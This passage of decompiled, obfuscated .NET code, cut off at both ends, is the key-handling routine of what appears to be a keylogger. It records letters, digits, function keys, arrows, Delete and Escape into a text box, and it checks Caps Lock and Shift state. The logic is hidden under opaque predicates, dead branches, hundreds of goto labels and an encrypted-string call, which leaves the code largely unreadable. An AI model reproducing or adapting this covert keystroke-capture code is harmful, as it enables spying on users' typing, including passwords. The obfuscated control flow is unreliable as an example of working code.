      flag2 = Key == Keys.D6;
      if (!flag2)
      {
        flag2 = Key == Keys.D7;
        if ((uint) flag2 - (uint) flag1 < 0U)
          return;
      }
      else
      {
        this.TextBox1.Text += "6";
        if ((uint) flag1 <= uint.MaxValue)
          return;
      }
      if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
        goto label_1367;
      else
        goto label_1349;
label_1374:
      this.TextBox1.Text += "5";
      return;
label_1375:
      flag2 = Key == Keys.D5;
      goto label_1371;
label_1382:
      if (false)
        return;
      if ((uint) flag1 + (uint) flag1 >= 0U)
      {
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        {
          if (((flag2 ? 1 : 0) | 1) == 0)
            goto label_1375;
        }
        else
          goto label_1264;
      }
      if ((uint) flag2 - (uint) flag2 >= 0U)
        goto label_1375;
label_1387:
      this.TextBox1.Text += "3";
      return;
label_1392:
      this.TextBox1.Text += "2";
      return;
label_1400:
      this.TextBox1.Text += "0";
      return;
label_1404:
      if (flag2)
        goto label_1406;
label_1405:
      do
      {
        flag2 = Key == Keys.D0;
        if ((uint) flag2 + (uint) flag1 >= 0U)
        {
          if (true)
          {
            if (!flag2)
              goto label_1397;
          }
          else
            goto label_1124;
        }
        else
          goto label_911;
      }
      while (false);
      goto label_1400;
label_1397:
      flag2 = Key == Keys.D1;
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
      {
        if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
        {
          if ((uint) flag1 - (uint) flag2 >= 0U)
          {
            if (!flag2)
            {
              if (Key != Keys.D2)
              {
                flag2 = Key == Keys.D3;
                if (((flag2 ? 1 : 0) & 0) != 0)
                  return;
                if (!flag2)
                {
                  flag2 = Key == Keys.D4;
                  if (flag2)
                  {
                    this.TextBox1.Text += "4";
                    if ((uint) flag2 <= uint.MaxValue)
                      return;
                    goto label_1375;
                  }
                  else
                    goto label_1382;
                }
                else
                {
                  if (false)
                    return;
                  if (((flag2 ? 1 : 0) | 8) != 0)
                    goto label_1387;
                  else
                    goto label_1419;
                }
              }
              else
                goto label_1392;
            }
            else
              this.TextBox1.Text += "1";
          }
          else
            goto label_2049;
        }
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
          return;
        goto label_1392;
      }
      else
        goto label_210;
label_1406:
      this.TextBox1.Text += "Z";
      return;
label_1408:
      if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
      {
        if (((flag2 ? 1 : 0) & 0) == 0)
          goto label_1406;
        else
          goto label_1405;
      }
      else
        goto label_1404;
label_1411:
      this.TextBox1.Text += "Y";
      return;
label_1416:
      flag2 = Key == Keys.W;
      if (flag2)
        goto label_1417;
label_1413:
      bool flag23 = Key == Keys.X;
      if (((flag23 ? 1 : 0) | 8) != 0 && !flag23)
      {
        if (Key != Keys.Y)
        {
          flag2 = Key == Keys.Z;
          goto label_1408;
        }
        else
        {
          if (false)
            return;
          goto label_1411;
        }
      }
      else
      {
        this.TextBox1.Text += "X";
        if (true)
          return;
        goto label_1755;
      }
label_1417:
      if (true)
      {
        if (true)
        {
          if (true)
          {
            this.TextBox1.Text += "W";
            return;
          }
          goto label_1413;
        }
      }
      else
        goto label_1257;
label_1419:
      if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
        goto label_1416;
label_1422:
      if (flag2 || (uint) flag1 - (uint) flag2 < 0U)
      {
        this.TextBox1.Text += "V";
        return;
      }
      if (false)
      {
        if ((uint) flag2 < 0U)
          goto label_1845;
        else
          goto label_1428;
      }
      else
        goto label_1430;
label_1425:
      flag2 = Key == Keys.V;
      goto label_1422;
label_1428:
      if (!flag2)
      {
        if ((uint) flag2 >= 0U)
        {
          if ((uint) flag1 < 0U)
            goto label_884;
          else
            goto label_1425;
        }
      }
      else
        goto label_1432;
label_1430:
      if (false)
        return;
      goto label_1416;
label_1432:
      this.TextBox1.Text += "U";
      goto label_1438;
label_1433:
      do
      {
        flag2 = Key == Keys.U;
        if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        {
          if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
            goto label_1437;
        }
        else
          goto label_1428;
      }
      while (true);
      goto label_1436;
label_1437:
      if ((uint) flag1 <= uint.MaxValue)
        goto label_1432;
      else
        goto label_1438;
label_1436:
      if (flag2)
        goto label_1440;
      else
        goto label_1433;
label_1438:
      if (true)
        return;
      if (((flag2 ? 1 : 0) & 0) != 0)
        goto label_757;
      else
        goto label_1425;
label_1439:
      flag2 = Key == Keys.T;
      if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
        goto label_1436;
label_1440:
      this.TextBox1.Text += "T";
      if (true)
        return;
      if (true)
        goto label_1419;
      else
        goto label_1954;
label_1443:
      if (Key != Keys.R)
      {
        if (Key == Keys.S)
        {
          this.TextBox1.Text += "S";
          return;
        }
        goto label_1439;
      }
label_1444:
      this.TextBox1.Text += "R";
      return;
label_1445:
      if (!flag2)
        goto label_1443;
label_1446:
      this.TextBox1.Text += "Q";
      return;
label_1450:
      this.TextBox1.Text += "P";
      if ((uint) flag1 <= uint.MaxValue)
        goto label_1457;
label_1454:
      if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
      {
        if ((uint) flag2 <= uint.MaxValue)
          return;
        goto label_369;
      }
      else
        goto label_1504;
label_1457:
      if (true)
      {
        if ((uint) flag1 + (uint) flag2 >= 0U)
          return;
        goto label_21;
      }
      else
        goto label_1446;
label_1458:
      flag2 = Key == Keys.O;
      if (!flag2)
      {
        if (((flag2 ? 1 : 0) | -2) != 0)
          goto label_1451;
label_1449:
        if (!flag2)
        {
          flag2 = Key == Keys.Q;
          goto label_1445;
        }
        else
          goto label_1450;
label_1451:
        if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        {
          flag2 = Key == Keys.P;
          goto label_1449;
        }
        else
          goto label_1372;
      }
      else
      {
        this.TextBox1.Text += "O";
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          goto label_1454;
        else
          goto label_1457;
      }
label_1459:
      if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
        goto label_1458;
label_1460:
      if (!flag2)
      {
        if ((uint) flag2 <= uint.MaxValue)
        {
          if ((uint) flag1 + (uint) flag2 >= 0U)
            goto label_1458;
          else
            goto label_1445;
        }
        else
          goto label_815;
      }
      else
      {
        this.TextBox1.Text += "N";
        if ((uint) flag2 - (uint) flag2 >= 0U)
          return;
        if (((flag2 ? 1 : 0) & 0) == 0)
          goto label_1485;
        else
          goto label_1482;
      }
label_1466:
      this.TextBox1.Text += "M";
      return;
label_1467:
      if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
        goto label_949;
label_1468:
      flag2 = Key == Keys.M;
      if (!flag2)
      {
        flag2 = Key == Keys.N;
        goto label_1460;
      }
      else if (false)
      {
        if (true)
        {
          if (((flag2 ? 1 : 0) & 0) == 0)
            goto label_1467;
          else
            goto label_1466;
        }
      }
      else
        goto label_1466;
label_1476:
      if (!flag2)
      {
        if (true)
          goto label_1468;
        else
          goto label_1485;
      }
label_1479:
      this.TextBox1.Text += "L";
      if ((uint) flag2 >= 0U)
        return;
label_1482:
      this.TextBox1.Text += "K";
      return;
label_1485:
      if ((uint) flag2 + (uint) flag1 < 0U)
      {
        if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
          return;
        if (true)
          goto label_1493;
        else
          goto label_1500;
      }
      else
        goto label_1459;
label_1489:
      this.TextBox1.Text += "J";
      goto label_1496;
label_1491:
      if ((uint) flag1 > uint.MaxValue)
        return;
      if (true)
      {
        if (false)
          goto label_360;
        else
          goto label_1489;
      }
      else
        goto label_1496;
label_1493:
      flag2 = Key == Keys.J;
      if (true)
      {
        if (!flag2)
        {
          if (Key != Keys.K)
          {
            flag2 = Key == Keys.L;
            goto label_1476;
          }
          else
            goto label_1482;
        }
        else
          goto label_1491;
      }
      else
        goto label_1246;
label_1496:
      if (true)
        return;
label_1500:
      if ((uint) flag2 >= 0U)
        goto label_1482;
      else
        goto label_1459;
label_1502:
      this.TextBox1.Text += string.Intern(x1110bdd110cdcea4._xaacba899487bce8c("dick", 65643066));
      return;
label_1504:
      if (((flag2 ? 1 : 0) | int.MaxValue) == 0 || flag2)
        goto label_1502;
      else
        goto label_1493;
label_1509:
      if (true)
      {
        if (true)
          return;
        goto label_1502;
      }
      else
        goto label_278;
label_1515:
      if (Key != Keys.G)
      {
        flag2 = Key == Keys.H;
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue && (uint) flag1 + (uint) flag1 <= uint.MaxValue && !flag2)
        {
          flag2 = Key == Keys.I;
          goto label_1504;
        }
        else
        {
          this.TextBox1.Text += "H";
          goto label_1509;
        }
      }
      else
      {
        this.TextBox1.Text += "G";
        return;
      }
label_1520:
      if (!flag2)
      {
        if ((uint) flag1 <= uint.MaxValue)
          goto label_1515;
        else
          goto label_1515;
      }
      else
      {
        this.TextBox1.Text += "F";
        if ((uint) flag1 - (uint) flag1 >= 0U)
        {
          if ((uint) flag1 + (uint) flag1 >= 0U)
            return;
          goto label_1243;
        }
      }
label_1527:
      if ((uint) flag2 > uint.MaxValue)
        goto label_1530;
label_1528:
      flag2 = Key == Keys.F;
      goto label_1520;
label_1530:
      if (!flag2)
        goto label_1528;
label_1533:
      this.TextBox1.Text += "E";
      if ((uint) flag1 + (uint) flag2 >= 0U)
        return;
      goto label_1093;
label_1546:
      if (!flag2)
        goto label_1559;
label_1547:
      this.TextBox1.Text += "B";
      return;
label_1551:
      do
      {
        flag2 = Key == Keys.B;
        if ((uint) flag2 - (uint) flag1 >= 0U)
        {
          if (true)
            goto label_1557;
        }
        else
          goto label_4;
      }
      while ((uint) flag1 - (uint) flag2 <= uint.MaxValue);
      goto label_1553;
label_1557:
      if (true)
      {
        if (true)
          goto label_1546;
        else
          goto label_1547;
      }
      else
        goto label_1559;
label_1553:
      if (flag1)
        goto label_1560;
      else
        goto label_1551;
label_1559:
      if (true)
        goto label_1567;
      else
        goto label_1553;
label_1560:
      this.TextBox1.Text += "A";
      if ((uint) flag1 <= uint.MaxValue)
        return;
      goto label_1567;
label_1563:
      flag2 = !MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock;
      if (!flag2)
      {
        flag2 = MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock;
        if (false)
          goto label_993;
        else
          goto label_822;
      }
      else if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
      {
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag2 > uint.MaxValue)
            return;
          goto label_1170;
        }
        else
          goto label_1460;
      }
      else
      {
        flag1 = Key == Keys.A;
        goto label_1553;
      }
label_1567:
      if (true)
      {
        flag2 = Key == Keys.C;
        if (!flag2)
        {
          flag2 = Key == Keys.D;
          if (!flag2)
          {
            if ((uint) flag2 - (uint) flag1 < 0U)
            {
              if (false)
                goto label_4;
              else
                goto label_1230;
            }
            else if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
            {
              flag2 = Key == Keys.E;
              goto label_1530;
            }
            else
              goto label_1533;
          }
          else
          {
            this.TextBox1.Text += "D";
            goto label_1569;
          }
        }
        else
          this.TextBox1.Text += "C";
      }
      if ((uint) flag1 - (uint) flag1 >= 0U)
        return;
label_1569:
      if ((uint) flag2 + (uint) flag2 >= 0U)
        return;
      if ((uint) flag2 + (uint) flag2 >= 0U && ((flag1 ? 1 : 0) | -2) != 0)
      {
        if (false)
          goto label_118;
        else
          goto label_1515;
      }
      else
        goto label_1520;
label_1570:
      if (!flag2)
        return;
      this.TextBox1.Text += "*";
      return;
label_1574:
      if (!flag2)
      {
        flag2 = Key == Keys.Multiply;
        goto label_1570;
      }
      else
      {
        this.TextBox1.Text += "+";
        return;
      }
label_1579:
      flag2 = Key == Keys.Add;
      goto label_1574;
label_1585:
      this.TextBox1.Text += "-";
      if ((uint) flag2 >= 0U)
        return;
label_1586:
      if (!flag2)
      {
        flag2 = Key == Keys.Subtract;
        if (false)
          return;
        if (flag2)
          goto label_1585;
        else
          goto label_1579;
      }
      else
      {
        this.TextBox1.Text += ".";
        return;
      }
label_1592:
      if (!flag2)
      {
        flag2 = Key == Keys.Decimal;
        if ((uint) flag2 < 0U)
          return;
        goto label_1586;
      }
label_1595:
      this.TextBox1.Text += "/";
      return;
label_1606:
      if (!flag2)
      {
        flag2 = Key == Keys.Divide;
        if ((uint) flag2 - (uint) flag1 < 0U)
        {
          if (true)
          {
            if ((uint) flag1 - (uint) flag1 >= 0U && ((flag1 ? 1 : 0) | int.MaxValue) == 0)
              return;
            if (((flag1 ? 1 : 0) & 0) != 0)
            {
              if ((uint) flag2 + (uint) flag1 >= 0U)
                goto label_1387;
              else
                goto label_1375;
            }
            else if (false)
            {
              if ((uint) flag1 - (uint) flag2 >= 0U)
              {
                if (((flag1 ? 1 : 0) & 0) == 0)
                  goto label_1287;
                else
                  goto label_1285;
              }
              else
                goto label_1668;
            }
            else
              goto label_1374;
          }
          else
            goto label_613;
        }
        else
        {
          if (true)
          {
            if (true)
            {
              if (((flag1 ? 1 : 0) & 0) != 0)
              {
                if ((uint) flag2 - (uint) flag1 >= 0U)
                  goto label_1595;
              }
              else
                goto label_1592;
            }
            else
              goto label_788;
          }
          if (((flag2 ? 1 : 0) & 0) == 0)
            goto label_1586;
          else
            goto label_1574;
        }
      }
      else
      {
        this.TextBox1.Text += "<ESC>";
        if ((uint) flag2 >= 0U)
          return;
        goto label_1887;
      }
label_1609:
      flag2 = Key == Keys.Escape;
      if (false)
      {
        if ((uint) flag2 - (uint) flag1 >= 0U)
          goto label_1613;
      }
      else if (true)
        goto label_1606;
      else
        goto label_1887;
label_1611:
      if (((flag2 ? 1 : 0) & 0) == 0)
      {
        this.TextBox1.Text += "<END>";
        return;
      }
      goto label_1950;
label_1613:
      flag2 = Key == Keys.End;
      if (!flag2)
        goto label_1609;
      else
        goto label_1611;
label_1618:
      if (Key == Keys.Tab)
      {
        this.TextBox1.Text += "<TAB>";
        return;
      }
      goto label_1613;
label_1620:
      this.TextBox1.Text += "?";
      if (((flag1 ? 1 : 0) & 0) == 0)
        return;
      if ((uint) flag2 <= uint.MaxValue)
        goto label_1618;
      else
        goto label_1649;
label_1623:
      flag2 = Key == Keys.Right;
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
      {
        if (true)
        {
          if (!flag2)
            goto label_1618;
          else
            goto label_1620;
        }
        else
          goto label_1003;
      }
      else
        goto label_193;
label_1624:
      if (flag2)
      {
        this.TextBox1.Text += "?";
        return;
      }
      goto label_1623;
label_1627:
      flag2 = Key == Keys.Left;
      if (((flag1 ? 1 : 0) & 0) != 0)
      {
        if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
          return;
        if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
          goto label_1623;
        else
          goto label_1623;
      }
      else
        goto label_1624;
label_1639:
      if (!flag2)
      {
        flag2 = Key == Keys.Down;
        while (!flag2)
        {
          if ((uint) flag2 <= uint.MaxValue)
          {
label_1633:
            flag2 = Key == Keys.Up;
            if (((flag2 ? 1 : 0) | int.MaxValue) != 0)
            {
              if (flag2)
              {
                this.TextBox1.Text += "?";
                if ((uint) flag2 < 0U)
                {
                  if (((flag1 ? 1 : 0) | 15) == 0)
                    goto label_1633;
                }
                else
                {
                  if (true)
                    return;
                  goto label_1618;
                }
              }
              else
                goto label_1627;
            }
            else
              goto label_1187;
          }
          else
            goto label_862;
        }
        this.TextBox1.Text += "?";
        if (((flag2 ? 1 : 0) | 15) != 0)
        {
          if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
            return;
          goto label_1592;
        }
        else
          goto label_128;
      }
      else
      {
        this.TextBox1.Text += "<DEL>";
        return;
      }
label_1642:
      if (true)
      {
        if (true)
          return;
        goto label_1639;
      }
      else
        goto label_2027;
label_1643:
      if (!flag2)
      {
        flag2 = Key == Keys.Back;
        goto label_1639;
      }
      else
      {
        this.TextBox1.Text += "<DEL>";
        goto label_1642;
      }
label_1647:
      if (!flag2)
      {
        flag2 = Key == Keys.Delete;
        if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
          goto label_899;
        else
          goto label_1643;
      }
      else
      {
        this.TextBox1.Text += "<F12>";
        return;
      }
label_1649:
      flag2 = Key == Keys.F12;
      if (false)
        return;
      goto label_1647;
label_1663:
      flag2 = Key == Keys.F11;
      if (((flag1 ? 1 : 0) | 2) != 0)
      {
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
        {
          if (!flag2)
          {
            if (false)
              goto label_4;
          }
          else
          {
            this.TextBox1.Text += "<F11>";
            if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
              return;
          }
          if (((flag1 ? 1 : 0) & 0) != 0)
            return;
          goto label_1649;
        }
        else
          goto label_208;
      }
      else
        goto label_281;
label_1668:
      if ((uint) flag2 - (uint) flag1 < 0U)
        goto label_517;
label_1669:
      if (!flag2)
        goto label_1663;
      else
        goto label_1674;
label_1672:
      flag2 = Key == Keys.F10;
      if ((uint) flag1 - (uint) flag2 >= 0U)
        goto label_1668;
      else
        goto label_1674;
label_1673:
      if (flag2)
      {
        this.TextBox1.Text += "<F9>";
        return;
      }
      goto label_1672;
label_1674:
      if (false)
        return;
      this.TextBox1.Text += "<F10>";
      return;
label_1680:
      flag2 = Key == Keys.F9;
      goto label_1673;
label_1703:
      if ((uint) flag2 - (uint) flag2 >= 0U && !flag2)
      {
        do
        {
          flag2 = Key == Keys.F7;
          if ((uint) flag1 >= 0U)
          {
            if (((flag2 ? 1 : 0) & 0) == 0)
            {
              if ((uint) flag1 - (uint) flag1 < 0U)
              {
                if ((uint) flag2 + (uint) flag2 < 0U)
                  goto label_459;
              }
              else
                goto label_1688;
            }
            else
              goto label_1785;
          }
          else
            break;
        }
        while ((uint) flag2 + (uint) flag2 > uint.MaxValue);
        goto label_1700;
label_1688:
        if (!flag2)
        {
          bool flag24 = Key == Keys.F8;
          if (flag24 || ((flag24 ? 1 : 0) & 0) != 0)
          {
            this.TextBox1.Text += "<F8>";
            if (true)
              return;
            goto label_1680;
          }
          else
            goto label_1680;
        }
label_1693:
        this.TextBox1.Text += "<F7>";
        return;
label_1700:
        if (((flag1 ? 1 : 0) & 0) != 0 || ((flag1 ? 1 : 0) & 0) == 0)
          goto label_1693;
        else
          goto label_4;
      }
      else
      {
        this.TextBox1.Text += "<F6>";
        return;
      }
label_1710:
      flag2 = Key == Keys.F5;
      if (!flag2)
      {
        if (true)
        {
          flag2 = Key == Keys.F6;
          if ((uint) flag2 + (uint) flag2 < 0U)
            goto label_1151;
          else
            goto label_1703;
        }
        else
          goto label_197;
      }
      else
      {
        this.TextBox1.Text += "<F5>";
        return;
      }
label_1716:
      flag2 = Key == Keys.F4;
      if (flag2)
      {
        this.TextBox1.Text += "<F4>";
        return;
      }
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag1 + (uint) flag2 >= 0U)
          goto label_1710;
        else
          goto label_1703;
      }
label_1721:
      if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag2 - (uint) flag1 >= 0U)
        {
          if (((flag1 ? 1 : 0) | -2) == 0)
          {
            if ((uint) flag2 - (uint) flag2 > uint.MaxValue)
              goto label_1159;
            else
              goto label_1827;
          }
          else
            goto label_1716;
        }
        else
          goto label_1491;
      }
      else
        goto label_4;
label_1755:
      if (!flag23)
      {
        flag2 = Key == Keys.Space;
        if (true)
        {
          if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
          {
            if ((uint) flag2 - (uint) flag2 >= 0U)
            {
              if (!flag2)
              {
                flag2 = Key == Keys.Return;
                while (!flag2)
                {
                  flag2 = Key == Keys.F1;
                  if (true)
                  {
                    if ((uint) flag1 <= uint.MaxValue)
                    {
                      if (!flag2)
                      {
                        bool flag25 = Key == Keys.F2;
                        if (!flag25)
                        {
                          if (Key == Keys.F3)
                          {
                            this.TextBox1.Text += "<F3>";
                            return;
                          }
                          goto label_1716;
                        }
                        else
                        {
                          if ((uint) flag1 - (uint) flag25 <= uint.MaxValue)
                          {
                            this.TextBox1.Text += "<F2>";
                            return;
                          }
                          goto label_1824;
                        }
                      }
                      else
                      {
                        this.TextBox1.Text += "<F1>";
                        return;
                      }
                    }
                    else
                      goto label_1703;
                  }
                }
                this.TextBox1.Text += "\r\n";
                return;
              }
              if (true)
              {
                this.TextBox1.Text += " ";
                return;
              }
              goto label_912;
            }
            else
              goto label_539;
          }
          else
            goto label_1553;
        }
      }
      else
      {
        this.TextBox1.Text += "`";
        return;
      }
label_1759:
      flag23 = Key == Keys.Oemtilde;
      if (false)
        goto label_1191;
      else
        goto label_1755;
label_1785:
      if (flag2)
        goto label_1791;
label_1786:
      flag2 = Key == Keys.OemPipe;
      while ((uint) flag2 >= 0U && !flag2)
      {
        if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
        {
          flag2 = Key == Keys.OemSemicolon;
          if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          {
            if (!flag2)
            {
              flag2 = Key == Keys.OemPeriod;
              if (!flag2)
              {
                if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
                {
                  if ((uint) flag1 - (uint) flag2 >= 0U)
                    goto label_1759;
                  else
                    goto label_1785;
                }
                else
                  goto label_2071;
              }
              else
              {
                this.TextBox1.Text += ".";
                return;
              }
            }
            else
            {
              this.TextBox1.Text += ";";
              if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
                return;
            }
          }
          else
            goto label_1167;
        }
        else
          goto label_1077;
      }
      this.TextBox1.Text += "\\";
      if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
        return;
      goto label_1721;
label_1791:
      this.TextBox1.Text += "/";
      return;
label_1800:
      if (flag2)
        goto label_1801;
      else
        goto label_1794;
label_1790:
      if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        goto label_601;
      else
        goto label_1791;
label_1794:
      flag2 = Key == Keys.OemQuestion;
      if (false)
      {
        if ((uint) flag2 <= uint.MaxValue)
          goto label_1790;
      }
      else
        goto label_1785;
label_1795:
      if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
        return;
      goto label_947;
label_1801:
      this.TextBox1.Text += "]";
      if ((uint) flag2 - (uint) flag1 >= 0U)
      {
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
          goto label_1795;
        else
          goto label_1790;
      }
label_1802:
      if (!flag2)
      {
        flag2 = Key == Keys.OemCloseBrackets;
        goto label_1800;
      }
label_1807:
      this.TextBox1.Text += "[";
      return;
label_1808:
      if (flag2)
        goto label_1810;
label_1809:
      flag2 = Key == Keys.OemOpenBrackets;
      if (true)
      {
        if ((uint) flag1 - (uint) flag1 < 0U)
          goto label_123;
        else
          goto label_1802;
      }
      else if ((uint) flag2 > uint.MaxValue)
      {
        if (false)
          goto label_1312;
        else
          goto label_521;
      }
label_1810:
      this.TextBox1.Text += "'";
      return;
label_1812:
      if ((uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        {
          flag2 = Key == Keys.OemQuotes;
          goto label_1808;
        }
        else
          goto label_1876;
      }
      else
        goto label_90;
label_1815:
      if (flag2)
        goto label_1818;
      else
        goto label_1812;
label_1817:
      if ((uint) flag2 + (uint) flag2 >= 0U)
        goto label_1815;
label_1818:
      this.TextBox1.Text += "-";
      return;
label_1822:
      if (flag11)
        goto label_1825;
label_1823:
      flag2 = Key == Keys.Oemcomma;
      if (!flag2)
      {
        if (true)
        {
          if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
            return;
          flag2 = Key == Keys.OemMinus;
          goto label_1817;
        }
        else
          goto label_845;
      }
      else
      {
        this.TextBox1.Text += ",";
        return;
      }
label_1825:
      this.TextBox1.Text += "9";
      if ((uint) flag1 <= uint.MaxValue)
        return;
      goto label_1823;
label_1824:
      flag11 = Key == Keys.NumPad9;
      goto label_1822;
label_1827:
      if (flag2)
      {
        this.TextBox1.Text += "8";
        return;
      }
      goto label_1824;
label_1829:
      if (!flag2)
      {
        flag2 = Key == Keys.NumPad8;
        goto label_1827;
      }
label_1831:
      this.TextBox1.Text += "7";
      return;
label_1834:
      flag2 = Key == Keys.NumPad7;
      if ((uint) flag2 < 0U)
      {
        if ((uint) flag1 + (uint) flag1 >= 0U)
        {
          if (false)
          {
            if (false)
              goto label_376;
          }
          else
            goto label_1831;
        }
        else
          goto label_934;
      }
      else
        goto label_1829;
label_1837:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag2 < 0U)
          goto label_1987;
        else
          goto label_1834;
      }
      else
      {
        this.TextBox1.Text += "6";
        return;
      }
label_1844:
      if (flag2)
      {
        this.TextBox1.Text += "5";
        return;
      }
label_1845:
      flag2 = Key == Keys.NumPad6;
      goto label_1837;
label_1856:
      flag2 = Key == Keys.NumPad5;
      goto label_1844;
label_1863:
      while (!flag2)
      {
        if ((uint) flag1 + (uint) flag2 > uint.MaxValue || (uint) flag2 + (uint) flag2 < 0U)
        {
          if (true)
          {
            if (((flag2 ? 1 : 0) & 0) == 0)
            {
              if (false)
                return;
              goto label_1856;
            }
            else
              goto label_4;
          }
        }
        else
          goto label_1856;
      }
label_1869:
      this.TextBox1.Text += "4";
      if (((flag2 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
          return;
        goto label_1863;
      }
label_1870:
      if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
      {
        flag2 = Key == Keys.NumPad4;
        goto label_1863;
      }
      else
        goto label_225;
label_1876:
      if (!flag2)
      {
        flag2 = Key == Keys.NumPad3;
        if (flag2)
        {
          this.TextBox1.Text += "3";
          return;
        }
        goto label_1870;
      }
label_1882:
      this.TextBox1.Text += "2";
      return;
label_1884:
      flag2 = Key == Keys.NumPad2;
      goto label_1876;
label_1887:
      if (false)
        return;
      goto label_1563;
label_1898:
      if (!flag2)
      {
        if (false)
          goto label_1439;
      }
      else
      {
        this.TextBox1.Text += "9";
        return;
      }
label_1900:
      if (((flag1 ? 1 : 0) | -1) != 0)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
        {
          bool flag26;
          do
          {
            flag2 = Key == Keys.NumPad0;
            if (true)
            {
              if (!flag2)
              {
                if (((flag2 ? 1 : 0) & 0) == 0)
                {
                  flag26 = Key == Keys.NumPad1;
                  if (flag26)
                    this.TextBox1.Text += "1";
                  else
                    goto label_1884;
                }
                else
                  goto label_1898;
              }
              else
                goto label_1894;
            }
            else
              goto label_524;
          }
          while ((uint) flag26 > uint.MaxValue && (uint) flag26 > uint.MaxValue);
          return;
label_1894:
          this.TextBox1.Text += "0";
          if (true)
            return;
          goto label_1927;
        }
        else
          goto label_821;
      }
      else
        goto label_604;
label_1910:
      bool flag27 = Key == Keys.D8;
      if (!flag27)
      {
        flag2 = Key == Keys.D9;
        goto label_1898;
      }
      else
      {
        this.TextBox1.Text += "8";
        if ((uint) flag27 >= 0U)
        {
          if ((uint) flag1 + (uint) flag27 >= 0U)
            return;
          goto label_1935;
        }
        else
          goto label_1925;
      }
label_1912:
      if (!flag2)
      {
        if (false)
          goto label_1560;
        else
          goto label_1910;
      }
label_1922:
      this.TextBox1.Text += "7";
      return;
label_1924:
      flag2 = Key == Keys.D7;
      goto label_1912;
label_1925:
      if (false)
        goto label_1411;
      else
        goto label_1924;
label_1927:
      if (!flag2)
        goto label_1924;
label_1931:
      this.TextBox1.Text += "6";
      if (true)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
          return;
        goto label_1925;
      }
label_1935:
      this.TextBox1.Text += "5";
      if (true)
        return;
      goto label_1931;
label_1943:
      if (true)
      {
        if (true)
        {
          if (((flag1 ? 1 : 0) | 4) != 0)
          {
            if (!flag2)
            {
              flag2 = Key == Keys.D6;
              goto label_1927;
            }
            else
              goto label_1935;
          }
          else
            goto label_1869;
        }
        else if (false)
        {
          if (((flag1 ? 1 : 0) | 1) != 0)
            goto label_1949;
        }
        else
          goto label_1954;
      }
      else
        goto label_1275;
label_1947:
      if ((uint) flag2 + (uint) flag2 < 0U)
        goto label_1809;
      else
        goto label_1943;
label_1949:
      this.TextBox1.Text += "4";
      return;
label_1950:
      flag2 = Key == Keys.D5;
      if (((flag2 ? 1 : 0) & 0) != 0)
      {
        if ((uint) flag2 > uint.MaxValue)
        {
          if ((uint) flag2 - (uint) flag1 >= 0U)
          {
            if ((uint) flag1 - (uint) flag2 >= 0U)
              goto label_444;
            else
              goto label_1884;
          }
          else
            goto label_448;
        }
        else
          goto label_443;
      }
      else
        goto label_1947;
label_1952:
      flag2 = Key == Keys.D4;
      if (flag2)
      {
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
          goto label_1949;
        else
          goto label_1943;
      }
      else
        goto label_1950;
label_1954:
      if ((uint) flag1 < 0U)
        goto label_1845;
label_1955:
      if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
        goto label_431;
      else
        goto label_1952;
label_1964:
      if (flag2)
      {
        this.TextBox1.Text += "3";
        if (((flag1 ? 1 : 0) & 0) == 0)
          return;
        goto label_1876;
      }
      else
        goto label_1978;
label_1970:
      flag2 = Key == Keys.D3;
      goto label_1977;
label_1973:
      this.TextBox1.Text += "2";
      return;
label_1977:
      if (true)
        goto label_1964;
label_1978:
      if (((flag1 ? 1 : 0) & 0) == 0)
        goto label_1954;
      else
        goto label_1994;
label_1987:
      if (!flag2)
      {
        bool flag28;
        do
        {
          flag28 = Key == Keys.D0;
          if (!flag28)
          {
            flag28 = Key == Keys.D1;
            if (flag28)
              this.TextBox1.Text += "1";
            else
              goto label_1975;
          }
          else
            goto label_1995;
label_1983:
          if (true)
          {
            if (false)
              continue;
